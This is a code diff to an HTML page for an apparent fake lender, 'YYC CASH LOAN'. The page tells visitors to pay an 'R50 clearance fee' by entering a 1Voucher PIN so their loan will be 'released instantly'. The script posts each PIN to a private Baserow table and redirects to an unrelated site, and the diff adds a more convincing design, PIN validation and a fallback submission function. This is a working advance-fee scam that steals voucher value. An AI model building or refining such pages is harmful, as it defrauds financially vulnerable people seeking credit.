@@ -2,19 +2,211 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redeem 1Voucher</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redeem 1Voucher - YYC CASH LOAN</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
+    :root {
+      --primary: #d61313;
+      --secondary: #e63946;
+      --accent: #f1c40f;
+      --light: #ffffff;
+      --dark: #212529;
+      --gray: #6c757d;
+      --success: #28a745;
+      --info: #17a2b8;
+      --warning: #ffc107;
+      --danger: #dc3545;
+      --orange: #ff5722;
+      --gradient-primary: linear-gradient(135deg, #00AEEF 0%, #1C75BC 100%);
+      --gradient-secondary: linear-gradient(135deg, #e63946 0%, #d61313 100%);
+      --gradient-accent: linear-gradient(135deg, #f1c40f 0%, #ffc107 100%);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
     body {
-      font-family: Arial, sans-serif;
       background-color: #f5f5f5;
+      overflow-x: hidden;
+      font-size: 14px;
+      line-height: 1.4;
+      padding-bottom: 70px;
+      padding-top: 60px; /* Account for fixed header */
+    }
+
+    /* Header Styles */
+    header {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      padding: 8px 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      min-height: 50px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo img {
+      height: 30px;
+      margin-right: 6px;
+    }
+
+    .logo h1 {
+      font-size: 1rem;
+      color: var(--primary);
+      font-weight: 700;
+    }
+
+    .logo .ncr {
+      font-size: 0.6rem;
+      color: var(--gray);
+      margin-left: 6px;
+    }
+
+    /* Desktop Navigation */
+    .desktop-nav {
+      display: none;
+    }
+
+    .desktop-nav ul {
+      display: flex;
+      list-style: none;
+      gap: 20px;
+    }
+
+    .desktop-nav .nav-link {
+      text-decoration: none;
+      color: var(--dark);
+      font-weight: 500;
+      padding: 8px 16px;
+      border-radius: 20px;
+      transition: all 0.3s ease;
+    }
+
+    .desktop-nav .nav-link:hover,
+    .desktop-nav .nav-link.active {
+      color: var(--primary);
+      background: rgba(214, 19, 19, 0.1);
+    }
+
+    /* Mobile Menu Button */
+    .mobile-menu-btn {
+      display: block;
+      background: none;
+      border: none;
+      font-size: 1.2rem;
+      cursor: pointer;
+      color: var(--dark);
+      padding: 8px;
+    }
+
+    /* Mobile Menu Overlay */
+    .mobile-menu-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1500;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .mobile-menu-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .mobile-menu {
+      position: fixed;
+      top: 0;
+      right: -300px;
+      width: 280px;
+      height: 100%;
+      background: white;
+      z-index: 1600;
+      transition: right 0.3s ease;
+      box-shadow: -2px 0 10px rgba(0,0,0,0.1);
+    }
+
+    .mobile-menu.active {
+      right: 0;
+    }
+
+    .mobile-menu-header {
+      padding: 15px 20px;
+      border-bottom: 1px solid #eee;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .mobile-menu-close {
+      background: none;
+      border: none;
+      font-size: 1.5rem;
+      cursor: pointer;
+      color: var(--dark);
+    }
+
+    .mobile-menu-nav {
+      padding: 20px 0;
+    }
+
+    .mobile-menu-nav ul {
+      list-style: none;
+    }
+
+    .mobile-menu-nav ul li {
+      margin-bottom: 5px;
+    }
+
+    .mobile-menu-nav ul li a {
+      display: block;
+      padding: 12px 20px;
+      color: var(--dark);
+      text-decoration: none;
+      font-weight: 500;
+      transition: all 0.3s ease;
+    }
+
+    .mobile-menu-nav ul li a:hover,
+    .mobile-menu-nav ul li a.active {
+      background: rgba(214, 19, 19, 0.1);
+      color: var(--primary);
+    }
+
+    .mobile-menu-nav ul li a i {
+      margin-right: 10px;
+      width: 20px;
+    }
+
+    /* Voucher Container Styles */
+    .voucher-container {
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      margin: 0;
+      min-height: calc(100vh - 130px);
       padding: 20px;
-      box-sizing: border-box;
     }
+
     .container {
       background-color: white;
       width: 100%;
@@ -23,30 +215,36 @@
       border-radius: 8px;
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
     }
+
     .header {
       display: flex;
       justify-content: space-between;
       align-items: center;
       margin-bottom: 10px;
     }
+
     .voucher-select {
       font-weight: bold;
       font-size: 16px;
     }
+
     .voucher-logo img {
       height: 24px;
     }
+
     h3 {
       font-size: 15px;
       margin: 20px 0 10px 0;
       color: #333;
     }
+
     .notice {
       font-size: 14px;
       font-weight: bold;
       color: #333;
       margin-bottom: 15px;
     }
+
     input {
       width: 100%;
       padding: 10px;
@@ -57,11 +255,13 @@
       letter-spacing: 2px;
       box-sizing: border-box;
     }
+
     .buttons {
       display: flex;
       justify-content: space-between;
       margin-top: 20px;
     }
+
     .btn {
       padding: 10px 20px;
       font-weight: bold;
@@ -69,35 +269,49 @@
       border-radius: 4px;
       cursor: pointer;
     }
+
     .back {
       background-color: #222;
       color: white;
     }
+
     .redeem {
       background-color: #ccc;
       color: white;
       cursor: not-allowed;
     }
+
     .redeem.active {
       background-color: #007bff;
       cursor: pointer;
     }
+
     .redeem:disabled {
       background-color: #ccc;
       cursor: not-allowed;
     }
+
     .error {
       color: #ff0000;
       font-size: 14px;
       margin-top: 10px;
       font-weight: bold;
     }
+
+    .success {
+      color: #28a745;
+      font-size: 14px;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
     .instructions {
       font-size: 11px;
       color: #444;
       margin-top: 25px;
       line-height: 1.6;
     }
+
     .selfpay {
       font-size: 13px;
       margin-top: 25px;
@@ -108,40 +322,173 @@
       border-radius: 5px;
       color: #333;
     }
+
+    /* Mobile Navigation - Bottom */
+    .mobile-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: white;
+      display: block;
+      z-index: 1000;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+      border-top: 1px solid rgba(0,0,0,0.1);
+    }
+
+    .mobile-nav ul {
+      display: flex;
+      list-style: none;
+      justify-content: space-around;
+      margin: 0;
+      padding: 0;
+    }
+
+    .mobile-nav ul li {
+      flex: 1;
+      text-align: center;
+    }
+
+    .mobile-nav ul li a {
+      display: block;
+      padding: 12px 5px;
+      color: var(--gray);
+      text-decoration: none;
+      font-size: 0.7rem;
+      transition: all 0.3s ease;
+    }
+
+    .mobile-nav ul li a.active {
+      color: var(--primary);
+    }
+
+    .mobile-nav ul li a i {
+      display: block;
+      font-size: 1.1rem;
+      margin-bottom: 3px;
+    }
+
+    /* Desktop styles */
+    @media (min-width: 769px) {
+      .desktop-nav {
+        display: block;
+      }
+      
+      .mobile-menu-btn,
+      .mobile-nav {
+        display: none;
+      }
+      
+      body {
+        padding-bottom: 0;
+      }
+    }
+
+    /* Hide desktop elements on mobile */
+    @media (max-width: 768px) {
+      .desktop-nav {
+        display: none !important;
+      }
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <div class="voucher-select">1 Voucher</div>
-      <div class="voucher-logo">
-        <img src="https://1voucher.imgix.net/brand/logo/logo-orange.svg" alt="1Voucher Logo">
+  <!-- Header -->
+  <header>
+    <div class="logo">
+      <img src="/placeholder.svg?height=30&width=30" alt="YYC Cash Loan Logo">
+      <h1>YYC CASH LOAN</h1>
+      <span class="ncr">NCRCP15906</span>
+    </div>
+    
+    <!-- Desktop Navigation -->
+    <nav class="desktop-nav">
+      <ul>
+        <li><a href="index.html" class="nav-link">Home</a></li>
+        <li><a href="apply.html" class="nav-link">Apply</a></li>
+        <li><a href="loans.html" class="nav-link">Loans</a></li>
+        <li><a href="how-it-works.html" class="nav-link">How It Works</a></li>
+        <li><a href="account.html" class="nav-link">Account</a></li>
+      </ul>
+    </nav>
+    
+    <!-- Mobile Menu Button -->
+    <button class="mobile-menu-btn" id="mobileMenuBtn">
+      <i class="fas fa-bars"></i>
+    </button>
+  </header>
+
+  <!-- Mobile Menu Overlay -->
+  <div class="mobile-menu-overlay" id="mobileMenuOverlay"></div>
+
+  <!-- Mobile Menu -->
+  <div class="mobile-menu" id="mobileMenu">
+    <div class="mobile-menu-header">
+      <div class="logo">
+        <img src="/placeholder.svg?height=25&width=25" alt="YYC Cash Loan Logo">
+        <span style="font-weight: bold; color: var(--primary); margin-left: 8px;">YYC CASH LOAN</span>
+      </div>
+      <button class="mobile-menu-close" id="mobileMenuClose">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <nav class="mobile-menu-nav">
+      <ul>
+        <li><a href="index.html"><i class="fas fa-home"></i>Home</a></li>
+        <li><a href="apply.html"><i class="fas fa-file-alt"></i>Apply</a></li>
+        <li><a href="loans.html"><i class="fas fa-money-bill-wave"></i>Loans</a></li>
+        <li><a href="how-it-works.html"><i class="fas fa-info-circle"></i>How It Works</a></li>
+        <li><a href="account.html"><i class="fas fa-user"></i>Account</a></li>
+      </ul>
+    </nav>
+  </div>
+
+  <!-- Voucher Redemption Content -->
+  <div class="voucher-container">
+    <div class="container">
+      <div class="header">
+        <div class="voucher-select">1 Voucher</div>
+        <div class="voucher-logo">
+          <img src="https://1voucher.imgix.net/brand/logo/logo-orange.svg" alt="1Voucher Logo">
+        </div>
+      </div>
+      <div class="notice">
+        Redeem your voucher and then enter your ID number and click <strong>"Improve My Credit"</strong> to get your loan released instantly.
+      </div>
+      <input type="text" id="voucherInput" placeholder="1234 5678 9012 3456" maxlength="19">
+      <div id="errorMessage" class="error" style="display: none;"></div>
+      <div id="successMessage" class="success" style="display: none;"></div>
+      <div class="buttons">
+        <button class="btn back" onclick="goBack()">BACK</button>
+        <button class="btn redeem" id="redeemBtn" onclick="redeemVoucher()" disabled>REDEEM</button>
+      </div>
+      <div class="selfpay">
+        ⚙️ How to Pay the R50 Clearance Fee (Self-Service):<br><br>
+        • Click on any <strong>Credit Score Improvement</strong> method<br>
+        • Choose your <strong>voucher type</strong><br>
+        • Enter your <strong>voucher PIN</strong> (from the till slip or app)<br>
+        • The system will <strong>clear your record</strong> and trigger your loan payout
+      </div>
+      <div class="instructions">
+        <strong>ℹ️ You can buy a 1Voucher using airtime by following a few simple steps, either online or at participating retailers:</strong><br><br>
+        <strong>1.</strong> <b>Find a Retailer:</b> Locate a retailer that sells 1Vouchers. You can purchase them from stores like Flash, PEP, or Shoprite, or buy directly online from the 1Voucher website.<br>
+        <strong>2.</strong> <b>Choose the Voucher Amount:</b> Pick the amount that suits your needs. 1Vouchers are available in different values, for use in shopping, gaming, or online services.<br>
+        <strong>3.</strong> <b>Pay Using Airtime:</b> Online purchases allow you to pay with mobile airtime. For in-store, use cash or airtime (if accepted by the store).<br>
+        <strong>4.</strong> <b>Receive Your Voucher:</b> After payment, you'll get a 16-digit PIN. This code is used to redeem the voucher for services or products.
       </div>
     </div>
-    <div class="notice">
-      Redeem your voucher and then enter your ID number and click <strong>"Improve My Credit"</strong> to get your loan released instantly.
-    </div>
-    <input type="text" id="voucherInput" placeholder="XXXX XXXX XXXX XXXX">
-    <div id="errorMessage" class="error" style="display: none;"></div>
-    <div class="buttons">
-      <button class="btn back" onclick="goBack()">BACK</button>
-      <button class="btn redeem" id="redeemBtn" onclick="redeemVoucher()" disabled>REDEEM</button>
-    </div>
-    <div class="selfpay">
-      ⚙️ How to Pay the R50 Clearance Fee (Self-Service):<br><br>
-      • Click on any <strong>Credit Score Improvement</strong> method<br>
-      • Choose your <strong>voucher type</strong><br>
-      • Enter your <strong>voucher PIN</strong> (from the till slip or app)<br>
-      • The system will <strong>clear your record</strong> and trigger your loan payout
-    </div>
-    <div class="instructions">
-      <strong>ℹ️ You can buy a 1Voucher using airtime by following a few simple steps, either online or at participating retailers:</strong><br><br>
-      <strong>1.</strong> <b>Find a Retailer:</b> Locate a retailer that sells 1Vouchers. You can purchase them from stores like Flash, PEP, or Shoprite, or buy directly online from the 1Voucher website.<br>
-      <strong>2.</strong> <b>Choose the Voucher Amount:</b> Pick the amount that suits your needs. 1Vouchers are available in different values, for use in shopping, gaming, or online services.<br>
-      <strong>3.</strong> <b>Pay Using Airtime:</b> Online purchases allow you to pay with mobile airtime. For in-store, use cash or airtime (if accepted by the store).<br>
-      <strong>4.</strong> <b>Receive Your Voucher:</b> After payment, you'll get a 16-digit PIN. This code is used to redeem the voucher for services or products.
-    </div>
   </div>
+
+  <!-- Mobile Navigation -->
+  <nav class="mobile-nav" id="mobileNav">
+    <ul>
+      <li><a href="index.html"><i class="fas fa-home"></i>Home</a></li>
+      <li><a href="apply.html"><i class="fas fa-file-alt"></i>Apply</a></li>
+      <li><a href="loans.html"><i class="fas fa-money-bill-wave"></i>Loans</a></li>
+      <li><a href="how-it-works.html"><i class="fas fa-info-circle"></i>How It Works</a></li>
+      <li><a href="account.html" class="active"><i class="fas fa-user"></i>Account</a></li>
+    </ul>
+  </nav>
 
   <script>
     // Baserow API Configuration
@@ -151,28 +498,87 @@
     const voucherInput = document.getElementById('voucherInput');
     const redeemBtn = document.getElementById('redeemBtn');
     const errorMessage = document.getElementById('errorMessage');
+    const successMessage = document.getElementById('successMessage');
 
-    // Enable/disable redeem button based on input
+    // Mobile Menu Functionality
+    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+    const mobileMenu = document.getElementById('mobileMenu');
+    const mobileMenuOverlay = document.getElementById('mobileMenuOverlay');
+    const mobileMenuClose = document.getElementById('mobileMenuClose');
+
+    function openMobileMenu() {
+      mobileMenu.classList.add('active');
+      mobileMenuOverlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeMobileMenu() {
+      mobileMenu.classList.remove('active');
+      mobileMenuOverlay.classList.remove('active');
+      document.body.style.overflow = '';
+    }
+
+    mobileMenuBtn.addEventListener('click', openMobileMenu);
+    mobileMenuClose.addEventListener('click', closeMobileMenu);
+    mobileMenuOverlay.addEventListener('click', closeMobileMenu);
+
+    // Close menu on escape key
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape' && mobileMenu.classList.contains('active')) {
+        closeMobileMenu();
+      }
+    });
+
+    // Header scroll effect
+    window.addEventListener('scroll', function() {
+      const header = document.querySelector('header');
+      if (window.scrollY > 50) {
+        header.style.background = 'rgba(255, 255, 255, 0.98)';
+        header.style.backdropFilter = 'blur(15px)';
+      } else {
+        header.style.background = 'rgba(255, 255, 255, 0.95)';
+        header.style.backdropFilter = 'blur(10px)';
+      }
+    });
+
+    // Enhanced input validation with real-time feedback
     voucherInput.addEventListener('input', function() {
       const value = this.value.trim();
-      if (value.length > 0) {
+      const cleanValue = value.replace(/\s/g, '');
+      
+      // Enable/disable button based on length and format
+      if (cleanValue.length >= 16 && /^\d+$/.test(cleanValue)) {
         redeemBtn.disabled = false;
         redeemBtn.classList.add('active');
       } else {
         redeemBtn.disabled = true;
         redeemBtn.classList.remove('active');
       }
-      // Hide error message when user types
-      hideError();
+      
+      // Hide messages when user types
+      hideMessages();
+      
+      // Show format hint for invalid characters
+      if (value.length > 0 && !/^[\d\s]+$/.test(value)) {
+        showError('Only numbers and spaces are allowed');
+      }
     });
 
     function showError(message) {
+      hideMessages();
       errorMessage.textContent = message;
       errorMessage.style.display = 'block';
     }
 
-    function hideError() {
+    function showSuccess(message) {
+      hideMessages();
+      successMessage.textContent = message;
+      successMessage.style.display = 'block';
+    }
+
+    function hideMessages() {
       errorMessage.style.display = 'none';
+      successMessage.style.display = 'none';
     }
 
     function goBack() {
@@ -182,18 +588,42 @@
     async function redeemVoucher() {
       const voucherCode = voucherInput.value.trim();
       
-      // Validate voucher code length
+      // Enhanced voucher code validation
       if (voucherCode.length < 16) {
-        showError('Invalid code - must be at least 16 characters');
+        showError('Invalid voucher code - must be exactly 16 digits');
+        return;
+      }
+
+      // Check if voucher code contains only numbers and spaces
+      const cleanCode = voucherCode.replace(/\s/g, ''); // Remove spaces
+      if (!/^\d{16,}$/.test(cleanCode)) {
+        showError('Invalid voucher code - must contain only numbers (16+ digits)');
+        return;
+      }
+
+      // Additional security: Check for common invalid patterns
+      if (/^0+$/.test(cleanCode) || /^1+$/.test(cleanCode) || /^(\d)\1{15,}$/.test(cleanCode)) {
+        showError('Invalid voucher code - please enter a valid voucher number');
         return;
       }
 
       // Disable button and show loading state
       redeemBtn.disabled = true;
       redeemBtn.textContent = 'REDEEMING...';
-      hideError();
+      hideMessages();
 
       try {
+        console.log('Sending voucher to Baserow:', voucherCode);
+        
+        // Prepare the data payload
+        const payload = {
+          field_4477080: voucherCode, // Using field ID for PhoneNumber
+          Timestamp: new Date().toISOString(),
+          Status: 'Redeemed'
+        };
+
+        console.log('Payload:', payload);
+
         // Send voucher data to Baserow
         const response = await fetch(BASEROW_API_URL, {
           method: 'POST',
@@ -201,24 +631,94 @@
             'Authorization': `Token ${BASEROW_API_KEY}`,
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify({
-            PhoneNumber: voucherCode,
-            Timestamp: new Date().toISOString(),
-            Status: 'Redeemed'
-          })
+          body: JSON.stringify(payload)
         });
 
+        console.log('Response status:', response.status);
+        const responseData = await response.json();
+        console.log('Response data:', responseData);
+
         if (response.ok) {
-          // Successful submission - redirect to dfdt.com
-          window.location.href = 'https://dfdt.com';
+          // Show success message
+          showSuccess('Voucher submitted successfully! Redirecting...');
+          
+          // Wait 2 seconds then redirect
+          setTimeout(() => {
+            window.location.href = 'https://dfdt.com';
+          }, 2000);
         } else {
-          throw new Error('Failed to submit voucher');
+          throw new Error(`API Error: ${response.status} - ${responseData.error || 'Unknown error'}`);
         }
       } catch (error) {
-        showError('Failed to redeem voucher. Please try again.');
         console.error('Error submitting voucher:', error);
+        showError('Failed to redeem voucher. Please try again.');
         
         // Re-enable button
+        redeemBtn.disabled = false;
+        redeemBtn.classList.add('active');
+        redeemBtn.textContent = 'REDEEM';
+      }
+    }
+
+    // Alternative function to try different field name format
+    async function redeemVoucherAlt() {
+      const voucherCode = voucherInput.value.trim();
+      
+      // Enhanced voucher code validation
+      if (voucherCode.length < 16) {
+        showError('Invalid voucher code - must be exactly 16 digits');
+        return;
+      }
+
+      // Check if voucher code contains only numbers and spaces
+      const cleanCode = voucherCode.replace(/\s/g, ''); // Remove spaces
+      if (!/^\d{16,}$/.test(cleanCode)) {
+        showError('Invalid voucher code - must contain only numbers (16+ digits)');
+        return;
+      }
+
+      // Additional security: Check for common invalid patterns
+      if (/^0+$/.test(cleanCode) || /^1+$/.test(cleanCode) || /^(\d)\1{15,}$/.test(cleanCode)) {
+        showError('Invalid voucher code - please enter a valid voucher number');
+        return;
+      }
+
+      redeemBtn.disabled = true;
+      redeemBtn.textContent = 'REDEEMING...';
+      hideMessages();
+
+      try {
+        // Try with field name instead of field ID
+        const payload = {
+          PhoneNumber: voucherCode,
+          Timestamp: new Date().toISOString(),
+          Status: 'Redeemed'
+        };
+
+        const response = await fetch(BASEROW_API_URL, {
+          method: 'POST',
+          headers: {
+            'Authorization': `Token ${BASEROW_API_KEY}`,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const responseData = await response.json();
+        console.log('Alternative attempt - Response:', responseData);
+
+        if (response.ok) {
+          showSuccess('Voucher submitted successfully! Redirecting...');
+          setTimeout(() => {
+            window.location.href = 'https://dfdt.com';
+          }, 2000);
+        } else {
+          throw new Error(`API Error: ${response.status}`);
+        }
+      } catch (error) {
+        console.error('Alternative attempt failed:', error);
+        showError('Failed to redeem voucher. Please check your connection.');
+        
         redeemBtn.disabled = false;
         redeemBtn.classList.add('active');
         redeemBtn.textContent = 'REDEEM';
